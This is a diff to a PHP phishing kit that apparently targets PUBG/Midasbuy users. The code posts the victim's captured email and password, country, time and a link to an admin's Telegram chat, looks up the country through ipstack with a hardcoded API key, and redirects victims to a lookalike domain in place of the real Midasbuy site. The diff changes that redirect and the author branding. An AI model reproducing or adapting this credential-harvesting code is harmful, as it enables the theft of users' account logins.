@@ -42,24 +42,20 @@ $api_key = "26dc150b1cf3c41dc866400812300e6d";
 $cty1 = file_get_contents("http://api.ipstack.com/".$ip."?access_key=".$api_key."&format=1");
 $jsondata = json_decode($cty1);
 $cty = $jsondata->country_name;
-$url1 = "https://www.midasbuy.com";
+$url1 = "https://pubgmidasbuy.me";
 header("location: $url1");
 $name = $message->from->first_name;
 bot("sendMessage",[
 "chat_id"=>$admin,
 "text"=>"
-======== ℳ𝒪 ℋ𝒜ℳ𝒜𝒟I ========
 𝐍𝐞𝐰 𝐋𝐨𝐠𝐢𝐧 𝐁𝐲 $login
-========ℳ𝒪 ℋ𝒜ℳ𝒜𝒟I ========
 👤 ¦ 𝑬𝒎𝒂𝒊𝒍 » `$email`
 📟 ¦ 𝑷𝒂𝒔𝒔𝒘𝒐𝒓𝒅  » `$password`
-========ℳ𝒪 ℋ𝒜ℳ𝒜𝒟I ========
 👁️‍🗨️¦ 𝑪𝒐𝒖𝒏𝒕𝒓𝒚 » $cty
 ⏱ ¦ 𝑻𝒊𝒎𝒆 » $time
 📝 ¦ 𝑫𝒂𝒕𝒆 » $day/$month/$year
-========ℳ𝒪 ℋ𝒜ℳ𝒜𝒟I ========
 🌐¦ 𝒀𝒐𝒖𝒓 𝑳𝒊𝒏𝒌 » https://$linky/index.php
-================ @PHP505 =============
+˹ 𝙳𝙴𝚅 𝙱𝚈 @PHP505 ˼
 ",
 'parse_mode'=>"MarkDown",
 'disable_web_page_preview'=>true,
@@ -78,3 +74,5 @@ bot("sendMessage",[
 </html>
 <?
 ?>
+
+
